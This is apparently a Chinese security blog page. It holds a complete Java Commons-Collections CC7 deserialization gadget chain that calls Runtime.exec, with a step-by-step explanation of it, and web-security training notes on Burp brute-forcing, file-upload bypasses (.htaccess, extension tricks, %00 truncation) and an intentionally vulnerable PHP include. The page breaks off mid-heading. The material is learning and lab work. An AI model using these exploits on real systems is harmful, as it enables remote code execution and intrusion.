      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch bbbb&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line"></span><br><span class="line">        lazyMap1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setField(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashtable);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-8"   >
          <a href="#解析-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-8" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="Hashtable-readObject"   >
          <a href="#Hashtable-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a><code>Hashtable.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102603926.png" alt="image-20220807102603926"></p>

        <h3 id="Hashtable-reconstitutionPut"   >
          <a href="#Hashtable-reconstitutionPut" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a><code>Hashtable.reconstitutionPut()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102732158.png" alt="image-20220807102732158"></p>
<p>由于<code>LazyMap</code>继承了<code>AbstractMapDecorator</code>，所以会调用到其<code>equals</code>函数</p>

        <h3 id="LazyMap-equals-AbstractMapDecorator-equals"   >
          <a href="#LazyMap-equals-AbstractMapDecorator-equals" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-equals-AbstractMapDecorator-equals" class="headerlink" title="LazyMap.equals()==AbstractMapDecorator.equals()"></a><code>LazyMap.equals()==AbstractMapDecorator.equals()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102940029.png" alt="image-20220807102940029"></p>
<p>这里的<code>equals</code>接着往下跳转就不知道为什么会直接跳到<code>AbstractMap.equals()</code>了</p>

        <h3 id="AbstractMap-equals"   >
          <a href="#AbstractMap-equals" class="heading-link"><i class="fas fa-link"></i></a><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a><code>AbstractMap.equals()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103216037.png" alt="image-20220807103216037"></p>

        <h3 id="LazyMap-get-3"   >
          <a href="#LazyMap-get-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-3" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>接着就是经典链子<code>CCI</code>了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103304810.png" alt="image-20220807103304810"></p>

        <h2 id="🔺注-2"   >
          <a href="#🔺注-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注-2" class="headerlink" title="🔺注"></a>🔺注</h2>
      
        <h3 id="1-hashtable-put两次"   >
          <a href="#1-hashtable-put两次" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-hashtable-put两次" class="headerlink" title="1.hashtable.put两次"></a>1.<code>hashtable.put</code>两次</h3>
      <p>由于需要在<code>Hashtable.reconstitutionPut()</code>中进入该循环，所以需要<code>hashtable.put</code>两次，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807104841649.png" alt="image-20220807104841649"></p>

        <h3 id="2-反射设置CCI链子"   >
          <a href="#2-反射设置CCI链子" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-反射设置CCI链子" class="headerlink" title="2.反射设置CCI链子"></a>2.反射设置<code>CCI</code>链子</h3>
      <p>如果直接进行设置，那么在本地<code>hashtable.put</code>的时候也会触发<code>RCE</code>，那么在<code>hashtable.put</code>之后再设置<code>CCI</code>链，就不会本地触发<code>RCE</code>了，这样是为了防止非预期的一些东西，就像在之前<code>CC5</code>中预防本地<code>RCE</code>一样。</p>
<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20220807105255253.png" alt="image-20220807105255253"></p>

        <h3 id="3-hash碰撞"   >
          <a href="#3-hash碰撞" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-hash碰撞" class="headerlink" title="3.hash碰撞"></a>3.hash碰撞</h3>
      <p>为什么<code>put</code>的时候需要<code>yy</code>和<code>zZ</code>，这样是为了使得其生成的<code>hash</code>相同，从而能够进行比较，在<code>Hashtable.reconstitutionPut()</code>中能够通过前面的<code>hash</code>相等条件</p>
<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20220807114011896.png" alt="image-20220807114011896"></p>
<p>当然换成其他的能够进行<code>hash</code>碰撞的也是一样的。</p>

        <h3 id="4-remove必要性"   >
          <a href="#4-remove必要性" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-remove必要性" class="headerlink" title="4.remove必要性"></a>4.remove必要性</h3>
      <p>至于为什么需要<code>lazyMap2.remove(&quot;zZ&quot;);</code>简单来说，就是第一次<code>hashtable.put</code>的时候，由于<code>hashtable.table</code>为<code>null</code>，无法进入循环到如下的<code>equals</code>函数触发<code>LazyMap.get()</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112631117.png" alt="image-20220807112631117"></p>
<p>但是第二次的时候就会进入比较函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112907832.png" alt="image-20220807112907832"></p>
<p>从而进入到<code>LazyMap.get()</code>调用空的<code>transform</code>函数数组，返回一个<code>key</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113208463.png" alt="image-20220807113208463"></p>
<p>导致我们的<code>LazyMap2</code>会多一个<code>key</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113425973.png" alt="image-20220807113425973"></p>
<p>如果保留下来，就无法进入到在<code>AbstractMap.equals</code>对应触发漏洞的地方，在如下地方就直接没掉，那么就需要去掉<code>lazyMap2</code>下由于空的<code>Transform</code>数组调用多出来的一个<code>key</code>了，都是为了进行各种绕过。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113545609.png" alt="image-20220807113545609"></p>

        <h1 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
      <p>感觉差不多了，没什么太多的地方需要慢慢学习了。</p>
<p>本菜鸡觉得<code>CC</code>链的学习主要就是分两部分吧</p>
<p>一部分是后面的用来调用命令的部分，我觉得叫<strong>命令链</strong>比较合适，比如这里写到的经典链子<code>CCI</code>，经典链子<code>ITN</code>之类的，这部分都大同小异，暂时就那一些。</p>
<p>另一部分就是从<code>readObject</code>调用到<strong>命令链</strong>的部分，这部分通常是需要需要慢慢挖掘的，主要的点就是找能调用到<code>transform</code>地方。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/06/19/%E5%AE%9E%E8%AE%AD/">大三末实训</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-06-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h2 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>实训的笔记，记录一下，防止忘记</p>

        <h2 id="网站URL"   >
          <a href="#网站URL" class="heading-link"><i class="fas fa-link"></i></a><a href="#网站URL" class="headerlink" title="网站URL"></a>网站URL</h2>
      <p>统一资源定位器(<code>uniform resource locator</code>)，用来定位服务器的资源</p>
<p>标准格式：<code>protocol://hostname[:port]/path/[?query]</code></p>
<p><code>http</code>默认80端口</p>
<ul>
<li><p><code>%[ascii]</code>：此外<code>+</code>也代表空格，常用来转换<code>&amp;</code>字符或者其他的一些特殊字符</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530112713188.png" alt="image-20220530112713188"></p>
</li>
<li><p><code>base64</code>编码：<code>http</code>环境下传递较长的标识信息</p>
</li>
<li><p><code>Hex</code>编码：</p>
</li>
</ul>

        <h2 id="协议HTTP"   >
          <a href="#协议HTTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议HTTP" class="headerlink" title="协议HTTP"></a>协议HTTP</h2>
      <p>无状态的协议，通过<code>cookie</code>和<code>session</code>来进行相关的状态处理</p>

        <h3 id="1-请求报文"   >
          <a href="#1-请求报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-请求报文" class="headerlink" title="(1)请求报文"></a>(1)请求报文</h3>
      
        <h4 id="①结构"   >
          <a href="#①结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#①结构" class="headerlink" title="①结构"></a>①结构</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530141434979.png" alt="image-20220530141434979"></p>
<ul>
<li><code>User-Agent</code>：产生请求的浏览器类型，一般可以随意指定，但是当服务器方面有限制则会受到影响，比如爬虫进行检查</li>
<li><code>Accept</code>：用户声明客户端可以处理的<code>MIME</code>类型，即文件类型</li>
<li><code>Accept-Encoding</code>：用于声明客户端能够理解的内容编码方式</li>
<li><code>Accept-Language</code>：用于声明客户端可以理解的自然语言</li>
<li><code>Cookie</code>：存放用户的身份凭证</li>
<li><code>Content-Length</code>：请求数据的长度，服务器端只会按照该字段进行长度解析，多余的截断。</li>
<li><code>Referer</code>：当前访问URL的上一个URL，用户从什么地方来到该页面的</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530142815202.png" alt="image-20220530142815202"></p>

        <h4 id="②请求方法"   >
          <a href="#②请求方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#②请求方法" class="headerlink" title="②请求方法"></a>②请求方法</h4>
      <p><code>GET/POST/CONNECT</code>等等</p>
<p><code>GET</code>：没有请求数据的部分，在URL中传输数据，由于URL长度限制，所以传输的数据也是有限制的。</p>
<p><code>POST</code>：在请求数据部分进行数据传输，长度基本没有什么限制，注意设置<code>Content-Type</code>和<code>Content-Length</code></p>

        <h3 id="2-响应报文"   >
          <a href="#2-响应报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-响应报文" class="headerlink" title="(2)响应报文"></a>(2)响应报文</h3>
      <p>描述服务器端的一些信息</p>

        <h4 id="①结构-1"   >
          <a href="#①结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①结构-1" class="headerlink" title="①结构"></a>①结构</h4>
      <ul>
<li><p><code>Data</code>：请求发送的时间和日期，GMT时间</p>
</li>
<li><p><code>Server</code>：告诉客户端服务器的名称和版本号</p>
</li>
<li><p><code>Content-Type</code>：响应正文的<code>MIME</code>类型</p>
</li>
<li><p><code>Content-Length</code>：响应正文的长度</p>
</li>
<li><p><code>Connection</code>：告诉客户端完成相应后的连接状态</p>
</li>
<li><p><code>Content-Encoding</code>：Web服务器告诉浏览器数据传输使用了那种压缩方法</p>
</li>
<li><p><code>Last-Modified</code>：实体报头域用于指示资源最后的修改日期和时间</p>
</li>
<li><p>状态码：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530143957584.png" alt="image-20220530143957584"></p>
<ul>
<li>200：请求成功</li>
<li>1XX：服务器收到请求，需要请求者继续执行操作</li>
<li>2XX：成功</li>
<li>3XX：重定向，需要进一步的操作用以完成请求。类似需要登录</li>
<li>4XX：客户端错误，请求包含语法错误或者无法完成请求</li>
<li>5XX：服务器端错误，服务器在处理请求的过程中发生了错误</li>
</ul>
</li>
</ul>
<p>等等，还有一些其他的</p>

        <h2 id="协议HTTPS"   >
          <a href="#协议HTTPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议HTTPS" class="headerlink" title="协议HTTPS"></a>协议HTTPS</h2>
      <p>在<code>HTTP</code>下加入了<code>SSL/TLS</code>层，通过安全机制进行传输数据。握手过程是明文传输，来建立<code>HTTPS</code>连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530144221805.png" alt="image-20220530144221805"></p>

        <h2 id="会话"   >
          <a href="#会话" class="heading-link"><i class="fas fa-link"></i></a><a href="#会话" class="headerlink" title="会话"></a>会话</h2>
      <p>利用<code>cookie</code>(客户端)和<code>session</code>(服务端)来进行保存会话状态，比如记住密码</p>
<p>客户端第一次发送数据给服务端时没有<code>Cookie</code>，服务器收到请求后，创建<code>Session</code>，之后通过<code>Set-Cookie</code>字段把<code>Session ID</code>以<code>Cookie</code>的形式告诉客户端。以后每次请求发送该<code>Cookie</code>到服务器，服务器即可识别。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530145435543.png" alt="image-20220530145435543"></p>

        <h2 id="关于Webshell"   >
          <a href="#关于Webshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于Webshell" class="headerlink" title="关于Webshell"></a>关于Webshell</h2>
      <p>一个服务器权限</p>

        <h2 id="身份认证"   >
          <a href="#身份认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2>
      <p>通常爆破</p>

        <h3 id="1-常见认证"   >
          <a href="#1-常见认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常见认证" class="headerlink" title="(1)常见认证"></a>(1)常见认证</h3>
      <p><code>Burpsuite</code>中的<code>Intruder</code>模块有很多选项</p>
<p>可以设置需要爆破的地方，爆破方式，编码方式，爆破字典，是否跳转(状态码为302)等等</p>

        <h3 id="2-Basic认证"   >
          <a href="#2-Basic认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Basic认证" class="headerlink" title="(2)Basic认证"></a>(2)Basic认证</h3>
      <p>常见<code>admin:passwd</code>等，关键词为：<code>Authorization：Basic [xxxx]</code>，其中<code>xxxx</code>即为<code>admin:passwd</code>的相关编码，这个可以在<code>Intruder-&gt;Payloads-&gt;Payload type</code>选择<code>Custom iterator</code>。之后在<code>Payload Options [Simple list]</code>中设置下不同的字典即可，即自定义一个字段的不同位置数据的迭代爆破。</p>
<ul>
<li>设置方式</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192510353.png" alt="image-20220530192510353"></p>
<ul>
<li><p>设置字典</p>
<ul>
<li><p>用户密码<img src="C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20220530192504191.png" alt="image-20220530192504191"></p>
</li>
<li><p>中间冒号</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192534539.png" alt="image-20220530192534539"></p>
</li>
<li><p>字典</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192702136.png" alt="image-20220530192702136"></p>
</li>
</ul>
</li>
<li><p>设置编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192746452.png" alt="image-20220530192746452"></p>
</li>
<li><p>取消特殊字符，这里即为<code>=</code>的<code>url</code>编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192817488.png" alt="image-20220530192817488"></p>
</li>
</ul>

        <h2 id="文件上传"   >
          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2>
      
        <h3 id="1-验证漏洞"   >
          <a href="#1-验证漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-验证漏洞" class="headerlink" title="(1)验证漏洞"></a>(1)验证漏洞</h3>
      <ul>
<li><p>客户端<code>JavaScript</code>验证</p>
<p>当发现不是从服务器返回的验证不通过信息，就可能是客户端本身的<code>JavaScript</code>进行了验证，那么就可以在<code>Burpsuite</code>发包的过程对文件进行修改，比如改掉文件名称等。</p>
<p>或者直接修改本地网页中的<code>JavaScript</code>代码，或者使用插件禁用掉<code>JavaScript</code>代码脚本</p>
</li>
<li><p>服务端验证</p>
<ul>
<li><p><code>MIME</code>限制：常见的服务器对<code>Content-Type</code>进行解析限制</p>
</li>
<li><p>文件内容验证：通常验证文件头，可以修改其文件头，或者将一句话木马放入到对应的文件内容最后</p>
<p><code>JPG</code>：FF D8 FF E0 00 10 4A 46 49 46</p>
<p><code>GIF</code>：47 49 46 38 39 61<code>(GIF89a)</code></p>
<p><code>PNG</code>：89 50 4E 47</p>
</li>
<li><p>文件扩展名验证：验证文件的后缀，黑名单白名单之类的</p>
<ul>
<li><p>大小写绕过(<code>Windows</code>下大小写不敏感)</p>
</li>
<li><p><code>windows</code>下的文件名后缀不规范（或者某些特殊字符）会被改掉，比如<code>test.php....</code>会被修改为<code>test.php</code>，但是这样就可以绕过验证了，实际还是执行的<code>php</code>文件。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212508036.png" alt="image-20220530212508036"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212656016.png" alt="image-20220530212656016"></p>
</li>
<li><p>如果只是替换后缀名，那么可以进行拓展后缀名绕过，比如<code>phphpp</code></p>
</li>
<li><p><code>%00</code>截断绕过：保存文件时可能会将文件名和目录进行拼接，那么就可以绕过<code>（PHP&lt;5.3.34）</code></p>
</li>
<li><p>特殊可解析后缀绕过：</p>
<p>在某些环境（比如基于<code>ubuntu</code>的<code>apt-get</code>按照的<code>apache</code>）中，会将某些特殊的文件名后缀当作某一类文件进行解析，比如<code>php3</code>会被当作<code>php</code>解析</p>
<p>可能是开发的时候历史遗留问题把</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530205111015.png" alt="image-20220530205111015"></p>
</li>
</ul>
</li>
<li><p><code>Apache</code>的<code>.htaccess</code>绕过</p>
<p><code>Apache</code>里面有一个配置文件，<code>xx.htacess</code>可以用来写入<code>Apache</code>配置信息，用来改变当前目录以及子目录下的<code>Apache</code>的配置信息。</p>
<p>需要如下条件：</p>
<ul>
<li><p>运行<code>.htaccess</code>生效</p>
</li>
<li><p><code>Apache</code>开启<code>rewrite</code>模块</p>
</li>
<li><p><code>Apache</code>配置文件为<code>AllowOverride All</code>（默认为<code>None</code>）</p>
</li>
</ul>
<p>那么就可以尝试上传该文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;sec.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></div></figure>

<p>之后当前配置下生效的地方，<code>sec.jpg</code>即可被解析为<code>php</code></p>
</li>
</ul>
</li>
</ul>

        <h3 id="2-服务器解析漏洞"   >
          <a href="#2-服务器解析漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-服务器解析漏洞" class="headerlink" title="(2)服务器解析漏洞"></a>(2)服务器解析漏洞</h3>
      <ul>
<li><p><code>Apache</code>解析漏洞</p>
<p>从右往左解析，<code>abc.php.ccc.aaa</code>会被当作<code>abc.php</code>来进行解析（某些版本）</p>
</li>
<li><p><code>IIS6.0</code>解析漏洞（<code>windows</code>的中间件）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530213952989.png" alt="image-20220530213952989"></p>
</li>
<li><p><code>Nginx</code>解析漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530214053524.png" alt="image-20220530214053524"></p>
</li>
</ul>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs" >c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="文件下载"   >
          <a href="#文件下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2>
      
        <h3 id="1-利用"   >
          <a href="#1-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用" class="headerlink" title="(1)利用"></a>(1)利用</h3>
      <p>过滤规则不好，可以下载任意文件</p>
<ul>
<li>获取站点源码</li>
<li>获取站点与中间件配置文件</li>
<li>获取应用与系统的配置文件</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601104430476.png" alt="image-20220601104430476"></p>
<p>可利用的相关配置文件</p>
<ul>
<li><p>Windows平台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105607099.png" alt="image-20220601105607099"></p>
</li>
<li><p>Linux平台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105623772.png" alt="image-20220601105623772"></p>
</li>
</ul>

        <h3 id="2-防御"   >
          <a href="#2-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-防御" class="headerlink" title="(2)防御"></a>(2)防御</h3>
      <ul>
<li>文件保存到数据库，依据ID进行下载</li>
<li>参数过滤，不能目录穿越</li>
</ul>

        <h2 id="文件包含"   >
          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>
      <p>即<code>include</code>和<code>require</code>相关函数，将用户指定的文件包含进来。那么如果该文件中有<code>php</code>代码，则会被执行，其他的字符，则会被输出。不受到相关文件后缀，文件头之类的限制。</p>

        <h3 id="1-函数解析"   >
          <a href="#1-函数解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-函数解析" class="headerlink" title="(1)函数解析"></a>(1)函数解析</h3>
      <ul>
<li><code>include</code>：包含过程中如果出现错误，只会生成警告（<code>E_WARNING</code>），在<code>include</code>函数后面的代码还是会正常被执行</li>
<li><code>require</code>：包含过程中如果出现错误，会生成致命错误（<code>E_COMPILE_ERROR</code>）并且停止脚本运行，之后的代码都不包会被运行。</li>
<li><code>include_once</code>和<code>require_once</code>两个函数，如果文件已经包含，则不会再次被包含，防止相关函数重定义或者变量重新赋值。</li>
</ul>

        <h3 id="2-漏洞利用"   >
          <a href="#2-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞利用" class="headerlink" title="(2)漏洞利用"></a>(2)漏洞利用</h3>
      <p>通过<code>PHP</code>函数引入文件时，如果对文件名没有限制或者合理的验证，很容易执行到相关的漏洞<code>php</code>代码或者文件信息泄露。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="①本地文件包含"   >
          <a href="#①本地文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#①本地文件包含" class="headerlink" title="①本地文件包含"></a>①本地文件包含</h4>
      <p>即包含服务器本身的文件。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=test.txt</span><br></pre></td></tr></table></div></figure>


        <h4 id="②远程文件包含"   >
